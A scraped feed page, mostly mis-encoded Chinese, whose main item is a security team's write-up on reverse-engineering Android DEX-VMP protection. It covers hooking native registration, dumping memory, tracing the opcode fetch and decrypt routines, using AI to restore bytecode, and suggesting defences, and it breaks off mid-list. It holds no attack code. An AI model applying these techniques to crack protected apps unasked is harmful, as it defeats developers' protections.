<li>antd 5.6.3 å·²å†…ç½®è™šæ‹Ÿæ»šåŠ¨ï¼Œ<strong>7 k+ èŠ‚ç‚¹æ— éœ€é¢å¤–åº“</strong>å³å¯æµç•…è¿è¡Œ</li>
<li>æœç´¢ + ä¹è§‚æ›´æ–° + é˜²æŠ–æ˜¯ä½“æ„Ÿæå‡æœ€å¤§ä¸‰ä»¶å¥—</li>
</ul>
</li>
</ul>

<ul>
<li><strong>æœªæ¥å±•æœ›ä¸æ”¹è¿›æ–¹å‘</strong>
<ul>
<li>æå‡ç»„ä»¶æ¸²æŸ“æ€§èƒ½ï¼Œå®ç° 1 w+èŠ‚ç‚¹çš„æµç•…å¤„ç†ã€‚</li>
<li>å°è£…ä¸º npm åŒ…ï¼Œåå“ºç¤¾åŒº</li>
</ul>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[VMPçš„æ‰‹åŠ¨åˆ†æå’ŒAIè¿˜åŸ]]></title>    <link>https://juejin.cn/post/7582231988146110515</link>    <guid>https://juejin.cn/post/7582231988146110515</guid>    <pubDate>2025-12-11T07:09:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582231988146110515" data-draft-id="7582202149909364745" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="VMPçš„æ‰‹åŠ¨åˆ†æå’ŒAIè¿˜åŸ"/> <meta itemprop="keywords" content="é€†å‘"/> <meta itemprop="datePublished" content="2025-12-11T07:09:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="360å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ"/> <meta itemprop="url" content="https://juejin.cn/user/1679709499035501"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            VMPçš„æ‰‹åŠ¨åˆ†æå’ŒAIè¿˜åŸ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1679709499035501/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    360å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T07:09:01.000Z" title="Thu Dec 11 2025 07:09:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">VMPçš„æ‰‹åŠ¨åˆ†æå’ŒAIè¿˜åŸ</h2>
<blockquote>
<p>ä½œè€…ï¼šuiop@360SRC</p>
</blockquote>
<h3 data-id="heading-1">å‰è¨€</h3>
<p>DEX-VMPï¼šä¸»è¦ä¿æŠ¤Androidåº”ç”¨ä¸­çš„Java/Kotlinæ–¹æ³•ã€‚å®ƒä¼šå°†Dexæ–‡ä»¶ä¸­çš„ARTå­—èŠ‚ç è½¬æ¢ä¸ºè‡ªå®šä¹‰å­—èŠ‚ç ï¼Œå¹¶å°†åŸæ–¹æ³•æ ‡è®°ä¸ºnativeæ–¹æ³•ã€‚</p>
<h3 data-id="heading-2">ä¸€ã€DEX-VMPå®ç°åŸç†</h3>
<p>æ ¹æ®artè™šæ‹Ÿæœºè§£é‡Šæ¨¡å¼å¯ä»¥æ¨¡ä»¿å®ç°è‡ªå®šä¹‰æ“ä½œç è¿›è¡Œå–å€¼ã€è¯‘ç ã€æ‰§è¡Œ
ä»¥ä¸‹æ˜¯ç®€æ˜“å®ç°</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-number">1.</span> <span class="hljs-comment">// ä¸€ä¸ªç®€åŒ–çš„è§£é‡Šå™¨æ ¸å¿ƒå¾ªç¯</span>
<span class="hljs-number">2.</span> <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
<span class="hljs-number">3.</span>     <span class="hljs-comment">// 1. å–å€¼ (Fetch)</span>
<span class="hljs-number">4.</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> opcode = *vip++; <span class="hljs-comment">// ä»æŒ‡ä»¤æµä¸­è¯»å–æ“ä½œç </span>
<span class="hljs-number">5.</span>  
<span class="hljs-number">6.</span>     <span class="hljs-comment">// 2. è¯‘ç  (Decode) å¹¶ 3. æ‰§è¡Œ (Execute)</span>
<span class="hljs-number">7.</span>     <span class="hljs-keyword">switch</span> (opcode) { <span class="hljs-comment">// æ ¹æ®è‡ªå®šä¹‰æ“ä½œç è·³è½¬åˆ°å¯¹åº”çš„å¤„ç†å‡½æ•°</span>
<span class="hljs-number">8.</span>         <span class="hljs-keyword">case</span> OP_ADD:  <span class="hljs-comment">// å¦‚æœæ˜¯åŠ æ³•æŒ‡ä»¤</span>
<span class="hljs-number">9.</span>             <span class="hljs-comment">// ... æ‰§è¡ŒåŠ æ³•çš„å…·ä½“ä»£ç  ...</span>
<span class="hljs-number">10.</span>             <span class="hljs-keyword">break</span>;
<span class="hljs-number">11.</span>         <span class="hljs-keyword">case</span> OP_MOV:  <span class="hljs-comment">// å¦‚æœæ˜¯ç§»åŠ¨æ•°æ®æŒ‡ä»¤</span>
<span class="hljs-number">12.</span>             <span class="hljs-comment">// ... æ‰§è¡Œç§»åŠ¨æ•°æ®çš„å…·ä½“ä»£ç  ...</span>
<span class="hljs-number">13.</span>             <span class="hljs-keyword">break</span>;
<span class="hljs-number">14.</span>         <span class="hljs-comment">// ... å…¶ä»–æˆç™¾ä¸Šåƒçš„æŒ‡ä»¤å¤„ç†åˆ†æ”¯ ...</span>
<span class="hljs-number">15.</span>     }
<span class="hljs-number">16.</span> }
</code></pre>
<h3 data-id="heading-3">äºŒã€æ‰‹åŠ¨åˆ†ææµç¨‹</h3>
<p>åˆ†ææµç¨‹æ ¹æ®å®ç°æ€è·¯ï¼Œå¯ä»¥å›´ç»•å–å€¼é˜¶æ®µæ¥è¿˜åŸè‡ªå®šä¹‰æ“ä½œç ï¼›</p>
<ul>
<li>
<p>1ã€é¦–å…ˆçœ‹çœ‹é™æ€åˆ†æèƒ½å¦è·å–åˆ°ä¿¡æ¯</p>
<p>é€šè¿‡hook registernativeè·å–åˆ°MainActivity.onCreateçš„åœ°å€åœ¨0x7401b38088
æŸ¥çœ‹mapså†…å­˜ç©ºé—´å¯ä»¥å®šä½æ³¨å†Œåœ¨ä»¥ä¸‹æ ‡è®°çš„ä¸€æ®µåŒ¿åå¯æ‰§è¡Œå†…å­˜ç©ºé—´ä¸­</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e000950cdf504ca5adfe7333e6cc3d73~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYw5a6J5YWo5bqU5oCl5ZON5bqU5Lit5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041741&amp;x-signature=p7IupW%2FCeYg0kIIJHBjAH40JdnI%3D" alt="" loading="lazy"/></p>
<p>å°†ä¸Šè¾¹å†…å­˜ç©ºé—´dumpå‡ºæ¥ï¼Œå¯ä»¥çœ‹åˆ°è¿™æ®µä»£ç ä¸ºè·³æ¿å‡½æ•°ä¼šè·³è½¬åˆ°0x7362fb934æ‰§è¡Œå‡½æ•°</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b417348cf05946bfa6294161c6b44e80~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYw5a6J5YWo5bqU5oCl5ZON5bqU5Lit5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041741&amp;x-signature=g8ZliG10sLXgvJpV6mOvEQJarFA%3D" alt="" loading="lazy"/></p>
<p>0x7362få¯¹åº”åœ¨ä¸‹è¾¹å†…å­˜ï¼Œé€šè¿‡ä»¥å‰å¯¹å£³çš„åˆ†æï¼Œè¿™æ®µåŒ¿åå†…å­˜æ˜¯é€šè¿‡å£³è¿›è¡ŒåŠ è½½å¹¶åŒ¿åçš„å®é™…é€»è¾‘å®ç°</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c562c7e3d3f4ee9bb4a8e14438e51f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYw5a6J5YWo5bqU5oCl5ZON5bqU5Lit5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041741&amp;x-signature=%2BU8IlnW6hmIv5AtgULK1HgEnNI4%3D" alt="" loading="lazy"/></p>
<p>å¯¹æ­£åœ¨æ‰§è¡Œoncreateå‡½æ•°çš„å†…å­˜è¿›è¡ŒDumpå¹¶å®Œæˆä¿®å¤ï¼Œä¼šå‘ç°å‡½æ•°å­˜åœ¨å¤§é‡brè·³è½¬ï¼Œæ‰‹åŠ¨ç®€å•ä¿®å¤brè·³è½¬åæŸ¥çœ‹oncreateå‡½æ•°ï¼ˆæœªå®Œå…¨ä¿®å¤å®Œæ¯•ï¼‰ï¼Œéœ€ç»“åˆåŠ¨æ€åŠè‡ªåŠ¨ä¿®å¤</p>
<p>å¯ä»¥æŸ¥çœ‹å¤§ä½“å‡½æ•°æ‰§è¡Œé€»è¾‘</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/727d732fe898488f8048da025bb6e18d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYw5a6J5YWo5bqU5oCl5ZON5bqU5Lit5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041741&amp;x-signature=osaYWTR8wWyo33dVeMCt5SHut5U%3D" alt="" loading="lazy"/></p>
<p>ä¿®å¤åçš„cfgï¼Œå¯ä»¥çœ‹å‡ºå¾ˆå¤šè·³è½¬ç¼ºå¤±ï¼Œçº¯é é™æ€åˆ†ææ˜¯éå¸¸å›°éš¾ï¼Œéœ€è¦ç»“åˆåŠ¨æ€è°ƒè¯•æ¥ä¸‹ä¸€æ­¥åˆ†æ</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a0109e9123f4a15b3294bcbc36d0bc8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYw5a6J5YWo5bqU5oCl5ZON5bqU5Lit5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041741&amp;x-signature=BQyguPIPZecBBj2T%2Byuj9Vnq9hg%3D" alt="" loading="lazy"/></p>
</li>
<li>
<p>2ã€å®šä½å–å€¼é˜¶æ®µ</p>
<p>åˆ†ä¸ºæœ‰æ— æºç å¯¹æ¯”ï¼Œå¯ä½¿ç”¨ä¸¤ç§çªç ´æ–¹å¼,</p>
<ol>
<li>é€šè¿‡ JNITRACEåˆ†æå‡½æ•°å¤§è‡´æ‰§è¡Œé€»è¾‘ï¼Œä½¿ç”¨æŒ‡ä»¤çº§ Traceï¼Œé€šè¿‡æŒ‡ä»¤å—å¾ªç¯æ¬¡æ•°ç»“åˆå‡½æ•°æŒ‡ä»¤å¤§å°ï¼Œä»è€Œå®ç°çªç ´ã€‚</li>
<li>åˆ©ç”¨æœ‰æºç çš„å‡½æ•°å¼€å¤´çš„ç¨³å®šç‰¹å¾ï¼Œç›‘æ§è¯»å–æ“ä½œç²¾å‡†å‘½ä¸­ï¼Œå®ç°çªç ´ã€‚</li>
</ol>
<p>é€šè¿‡æŒ‡ä»¤å¤§å°å¹¶ç»“åˆtraceè¿›è¡Œå¿«é€Ÿå®šä½ä»£ç å—è¿›è¡Œåˆ†æï¼šé€šè¿‡åˆ†æoncreateå‡½æ•°å¼€å¤´ä»¥åŠæŒ‡ä»¤å¤§å°å®šä½å†…å­˜åŠ å¯†åçš„oncreateå‡½æ•°æŒ‡ä»¤ä½ç½®ï¼Œæ­¤ oncreateå‡½æ•°å­˜åœ¨58æ¡æŒ‡ä»¤
æºç å¼€å¤´ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/551d953e382449a285462b9c233f601a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYw5a6J5YWo5bqU5oCl5ZON5bqU5Lit5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041741&amp;x-signature=Mq5Q3%2Fi0l%2BdHiCHjnakA7ZHZJpM%3D" alt="" loading="lazy"/></p>
<p>åœ¨dumpçš„dexä¸­æŸ¥æ‰¾æŒ‡ä»¤å¼€å¤´ä½ç½®å†0x63f77c</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c30a5f43f6e477b8b78d56994ebb594~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYw5a6J5YWo5bqU5oCl5ZON5bqU5Lit5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041741&amp;x-signature=4Wc36t9EIfEehrGxTlaFwbRw5T8%3D" alt="" loading="lazy"/></p>
<p>é€šè¿‡traceçš„logåˆ†æåï¼Œå‘ç°ä»¥ä¸‹ä»£ç å—å‡ºç°äº†58æ¬¡æ­£å¥½ç»“åˆ58æ¡æŒ‡ä»¤ï¼ŒçŒœæµ‹å¹¶æ ‡è®°åœ°å€ä¸ºå–æŒ‡ä»¤è¡Œä¸º</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6caffa2d14b1437aabe7b8b8acb1b1a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYw5a6J5YWo5bqU5oCl5ZON5bqU5Lit5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041741&amp;x-signature=ghi1yhTPqTFur%2FFqG6mXfs3bT%2BQ%3D" alt="" loading="lazy"/></p>
<p>çŸ¥é“å–æŒ‡ä»¤åœ°å€åä¸‹ç›‘æ§æ–­ç‚¹éªŒè¯æŸ¥çœ‹ç¡®å®åœ¨0x167608å¤„å–å‡ºæŒ‡ä»¤</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/340be7184d6040cd97b98616afb2961c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYw5a6J5YWo5bqU5oCl5ZON5bqU5Lit5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041741&amp;x-signature=CRdKDG0f03EAzoaQ7nfdDnDPi%2BU%3D" alt="" loading="lazy"/></p>
<p>è·³è½¬è¿‡å»åˆ†æå–å€¼åè·³åˆ°0x16766c</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/95e56ee7f30143629679716b3adeed18~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYw5a6J5YWo5bqU5oCl5ZON5bqU5Lit5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041741&amp;x-signature=HqDxh%2BF2%2BLxbb2MmYX6m5URThyw%3D" alt="" loading="lazy"/></p>
<p>åˆ†æ0x16766cå–æŒ‡åæ“ä½œè¿›è¡Œå­—èŠ‚ç è§£å¯†å¤„ç†</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c81004850ebd417184eb708c1c928db9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYw5a6J5YWo5bqU5oCl5ZON5bqU5Lit5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041741&amp;x-signature=V4uLyoyi6EHwS5Xv%2FPMLH%2FFa8ys%3D" alt="" loading="lazy"/></p>
<p>é€šè¿‡ä»¥ä¸Šåˆ†æå¯ä»¥å‘ç°å®Œå…¨å’Œtraceçš„çŒœæµ‹ä¸€æ ·ã€‚</p>
<p>ç»§ç»­é€šè¿‡ä¿®å¤oncreateå‡½æ•°è¿½è¸ªåˆ†æ13353cå‘ç°å­˜åœ¨jniæ˜ å°„</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f3bfcdf9616148c7b907f7b6f2bb6d2d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYw5a6J5YWo5bqU5oCl5ZON5bqU5Lit5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041741&amp;x-signature=PhJ3JgqDjNJvtMvTgAnOrziGwes%3D" alt="" loading="lazy"/></p>
<p>ä¿®æ”¹ç»“æ„ä½“é¡ºåºè¿˜åŸè‡ªå®šä¹‰jniæ˜ å°„</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3151413ba0cb4cf8adf2795df0da926e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYw5a6J5YWo5bqU5oCl5ZON5bqU5Lit5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041741&amp;x-signature=%2FV454Zz87%2FaH%2B8PpFSKsa720h3I%3D" alt="" loading="lazy"/></p>
<p>å‘ä¸‹è¿½è¸ªæ‰¾åˆ°æ‰§è¡Œå®é™…å‡½æ•°æ“ä½œ</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7d049ae28ad459d8f7a53a1df5ccd1c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYw5a6J5YWo5bqU5oCl5ZON5bqU5Lit5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041741&amp;x-signature=1gS3rjf%2B3NVYjcgyH267Zh5NP84%3D" alt="" loading="lazy"/></p>
<p>é€šè¿‡å›è°ƒå‘ä¸Šåˆ†æ</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/135ae5edea9f469094fd630379e1d9df~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYw5a6J5YWo5bqU5oCl5ZON5bqU5Lit5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041741&amp;x-signature=9kOivGB%2F7olWZ5qRf65mAKM721Q%3D" alt="" loading="lazy"/></p>
<p>ç»“åˆtraceéªŒè¯ï¼Œç¡®å®šä¸ºåˆ†å‘æŒ‡ä»¤åˆ°0x15af88é‡Œè¾¹æ‰§è¡Œ</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/04e6d8dce9e0447ba2e5d08bd328b6e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYw5a6J5YWo5bqU5oCl5ZON5bqU5Lit5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041741&amp;x-signature=oaRBv%2BFUTUy%2FtkBBPLGHLHgBoR4%3D" alt="" loading="lazy"/></p>
<p>Hookè¯¥è§£å¯†å‡½æ•°è·å–æ‰€æœ‰opcode</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82fb71aa25f740cf8c232b252f9a242c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYw5a6J5YWo5bqU5oCl5ZON5bqU5Lit5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041741&amp;x-signature=I4zmLWWB600Anu%2Bo7JTWXQZFwdQ%3D" alt="" loading="lazy"/></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯é€šè¿‡dexç´¢å¼•æŸ¥æ‰¾å‡½æ•°ä¸€æ­¥æ­¥è¿›è¡Œå­—èŠ‚è¿˜åŸï¼Œéœ€è¦æ‰‹å·¥å¯¹ç…§ä¸€ç‚¹ç‚¹è¿˜åŸæ¯”è¾ƒè€—æ—¶ï¼›èƒ½å¦å–å·§ç»“åˆaiæ–¹å¼è¿›è¡Œè¿˜åŸï¼Œå¯ä»¥è¿›ä¸€æ­¥å®è·µï¼›</p>
</li>
</ul>
<h3 data-id="heading-4">ä¸‰ã€åŸºäºAIè¿˜åŸ</h3>
<p>dex vmpçš„åŸºç¡€æ”¯æ’‘å…¶å®æ˜¯jniå‡½æ•°ï¼Œé€šè¿‡è¿½è¸ªjniè°ƒç”¨ï¼Œäººå·¥åˆ†æåŸºæœ¬ä»£ç æµç¨‹ï¼Œç­›é€‰åçš„tracelogå†ç»“åˆå¼ºå¤§çš„aièƒ½åŠ›è¿›è¡Œè¿˜åŸèƒ½èŠ‚çœå¾ˆå¤šäººå·¥åˆ†ææµç¨‹æ—¶é—´ï¼Œä»¥ä¸‹ä¸ºaiè¿˜åŸå¯¹ç…§ï¼Œå¯ä»¥çœ‹åˆ°å¯¹äºç®€å•çš„å‡½æ•°å¯ä»¥è¿›è¡Œå®Œç¾è¿˜åŸï¼Œç¼ºç‚¹æ˜¯å¯¹äºå¤æ‚å‡½æ•°æ¶‰åŠçš„logéå¸¸å¤§çš„è¯éœ€è¦å¤šæ¬¡æ‹¼æ¥è¿›è¡Œåˆ†æï¼Œé€ æˆçš„ç»“æœå¯èƒ½ä¸æ˜¯ç‰¹åˆ«å‡†ç¡®ï¼Œä½†æ˜¯åŸºæœ¬é€»è¾‘ä¸ä¼šå‡ºç°é—®é¢˜å¯ä»¥è¿›è¡Œæ­£å¸¸çš„é€†å‘åˆ†æ</p>
<ul>
<li>
<p>Aiè¿˜åŸä»£ç ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/540d314b0bcd43618792c26ab34d21a5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYw5a6J5YWo5bqU5oCl5ZON5bqU5Lit5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041741&amp;x-signature=%2BUmT0%2FNozzaSCilXW127zN2yssg%3D" alt="" loading="lazy"/></p>
</li>
<li>
<p>æºdexåç¼–è¯‘ä»£ç ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b49b0f72e834e3390d7791924fceff6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYw5a6J5YWo5bqU5oCl5ZON5bqU5Lit5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041741&amp;x-signature=Q%2BLDUUbdV0GLMOPLqrmrvy7CEyA%3D" alt="" loading="lazy"/></p>
</li>
</ul>
<h3 data-id="heading-5">å››ã€VMPä¿æŠ¤æ›´å®‰å…¨çš„å±•æœ›</h3>
<p>é’ˆå¯¹ä»¥ä¸Šåˆ†æè¿‡ç¨‹ä½¿ç”¨çš„çªç ´æ–¹å¼ï¼Œå¯ä»¥é‡‡ç”¨çš„é˜²æŠ¤æ‰‹æ®µ</p>
<ul>
<li>
<p>JNItraceé˜²æŠ¤
1ã€é€šè¿‡jnienvè®¡ç®—æ‰€æœ‰jniå‡½æ•°åç§»é‡æ¥é€šè¿‡å‡½æ•°æŒ‡é’ˆå½¢å¼è¿›è¡Œè°ƒç”¨éšè—æ‰€æœ‰jniçš„è°ƒç”¨è¿‡ç¨‹
